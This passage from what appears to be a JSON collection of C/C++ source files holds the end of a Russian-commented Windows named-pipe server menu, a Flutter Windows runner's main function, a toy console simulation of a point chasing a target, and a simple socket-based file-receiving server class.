\u043f\u043e\u043a\u0430 \u0441\u043e\u0431\u044b\u0442\u0438\u0435 \u0441\u0442\u0430\u043d\u0435\u0442 \u0441\u0438\u0433\u043d\u0430\u043b\u044c\u043d\u044b\u043c\n        WaitForSingleObject(hEvent, INFINITE);\n        // \u041f\u043e\u0441\u043b\u0435 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u044f \u0430\u0441\u0438\u043d\u0445\u0440\u043e\u043d\u043d\u043e\u0439 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438 \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0441\u043e\u0431\u044b\u0442\u0438\u044f \u0441\u0442\u0430\u043d\u0435\u0442 \u0441\u0438\u0433\u043d\u0430\u043b\u044c\u043d\u044b\u043c\n    }\n\n}\n\nvoid menu() {\n    int choice;\n    do {\n        cout << \"\\n\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 \u0441\u0435\u0440\u0432\u0435\u0440\u0430: \\n\";\n        cout << \"1. \u0421\u043e\u0437\u0434\u0430\u0442\u044c \u0438\u043c\u0435\u043d\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u043a\u0430\u043d\u0430\u043b\\n\";\n        cout << \"2. \u0423\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435\\n\";\n        cout << \"3. \u0417\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435\\n\";\n        cout << \"4. \u0420\u0430\u0437\u043e\u0440\u0432\u0430\u0442\u044c \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435\\n\";\n        cout << \"5. \u0417\u0430\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u0440\u0430\u0431\u043e\u0442\u0443\\n\";\n        cin >> choice;\n        cin.ignore();\n\n        switch (choice) {\n        case 1:\n            createPipe();\n            break;\n        case 2:\n            connectPipe();\n            break;\n        case 3:\n            writeData();\n            break;\n        case 4:\n            disconnectPipe();\n            break;\n        case 5:\n            CloseHandle(hPipe);\n            CloseHandle(hEvent);\n            break;\n        default:\n            cout << \"\u041d\u0435\u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0432\u044b\u0431\u043e\u0440\u0430\\n\";\n        }\n    } while (choice != 5);\n}\n\nint main() {\n    setlocale(LC_ALL, \"Russian\");\n    menu();\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"row_column_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <cstdio>\n#include <unistd.h>\n\nstruct Missile {\n  int x;\n  int y;\n  int x_velocity;\n  int y_velocity;\n};\n\nstruct Point {\n  int x;\n  int y;\n};\n\nint main() {\n  Point target;\n  target.x = 1000;\n  target.y = 0;\n\n  Missile missile;\n  missile.x = 0;\n  missile.y = 0;\n  missile.x_velocity = 0;\n  missile.y_velocity = 0;\n\n  while (target.x > missile.x || target.y > missile.y) {\n    missile.x += missile.x_velocity;\n    missile.y += missile.y_velocity;\n\n    int x_distance = target.x - missile.x;\n    int y_distance = target.y - missile.y;\n\n    if (x_distance > 0 && missile.x_velocity < 913) {\n      missile.x_velocity += 1;\n    } else {\n      missile.x_velocity = 0;\n    }\n    if (y_distance > 0 && missile.x_velocity < 913) {\n      missile.y_velocity += 1;\n    } else {\n      missile.y_velocity = 0;\n    }\n\n    printf(\"\\x1b[2J\\n\");\n    printf(\"\\x1b[H\");\n    printf(\"-----------------------------\\n\");\n    printf(\"- Missile info\\n\");\n    printf(\"X: %d\\n\", missile.x);\n    printf(\"Y: %d\\n\", missile.y);\n    printf(\"X Velocity: %d\\n\", missile.x_velocity);\n    printf(\"Y Velocity: %d\\n\", missile.y_velocity);\n    printf(\"- Target Info\\n\");\n    printf(\"X: %d\\n\", target.x);\n    printf(\"Y: %d\\n\", target.y);\n    printf(\"X Distance: %d\\n\", x_distance);\n    printf(\"Y Distance: %d\\n\", y_distance);\n    printf(\"-----------------------------\");\n\n    usleep(50000);\n\n  }\n}\n",
    "#include \"Server.hpp\"\n\nServer::Server(BaseServerSocketFactory &server_socket_factory)\n{\n    this->socket = server_socket_factory.create();\n    this->buffer = std::make_unique<Buffer>(Buffer(this->socket->get_packet_size()));\n}\n\nServer::~Server()\n{\n    if (this->is_connected())\n    {\n        this->close_connection();\n    }\n}\n\nconst bool Server::is_connected() const\n{\n    return this->connection;\n}\n\nconst size_t Server::get_max_allowed_file_name_size() const\n{\n    return this->socket->get_packet_size() - 1 - sizeof(size_t);\n}\n\nstd::shared_ptr<FileInfo> Server::recv_file()\n{\n    std::shared_ptr<FileInfo> file = this->recv_file_info();\n    this->recv_file_body(*file);\n\n    return file;\n}\n\nvoid Server::recv_file_body(const FileInfo &file_info)\n{\n    std::ofstream file(file_info.name, std::ios::out | std::ios::binary);\n\n    if (!file.is_open())\n    {\n        throw OpeningFileException();\n    }\n\n    const size_t buffer_size = this->buffer->get_size();\n    size_t file_size = file_info.size;\n    size_t written_byte_number;\n\n    while (file_size > 0)\n    {\n        try\n        {\n            this->recv_in_buffer();\n        }\n        catch (std::exception exc)\n        {\n            std::remove(file_info.name.c_str());\n            throw exc;\n        }\n\n        written_byte_number = file_size;\n        if (file_size >= buffer_size)\n        {\n            written_byte_number = buffer_size;\n        }\n\n        file.write((char *)this->buffer->get_body(), written_byte_number);\n        file_size -= written_byte_number;\n    }\n\n    file.close();\n}\n\nstd::shared_ptr<FileInfo> Server::recv_file_info()\n{\n    this->buffer->clear();\n    this->recv_in_buffer();\n    return this->read_file_info_from_buffer();\n}\n\nstd::shared_ptr<FileInfo> Server::read_file_info_from_buffer()\n{\n    std::string file_name = std::string((char *)this->buffer->get_body());\n\n    if (file_name.size() > this->get_max_allowed_file_name_size())\n    {\n        throw FileNameExceedMaxLengthExcpetion();\n    }\n\n    size_t file_size = 0;\n    this->buffer->read((void *)&file_size, sizeof(file_size), file_name.size() + 1);\n\n    return std::make_shared<FileInfo>(FileInfo(file_name, file_size));\n}\n\nvoid Server::recv_in_buffer()\n{\n    this->socket->recv(this->buffer->get_body(), this->buffer->get_size());\n}\n\nvoid Server::establish_connection()\n{\n    this->socket->bind();\n    this->socket->listen();\n    this->socket->accept();\n    this->connection = true;\n}\n\nvoid Server::close_connection()\n{\n    this->socket->close();\n    this->connection = false;\n}"
]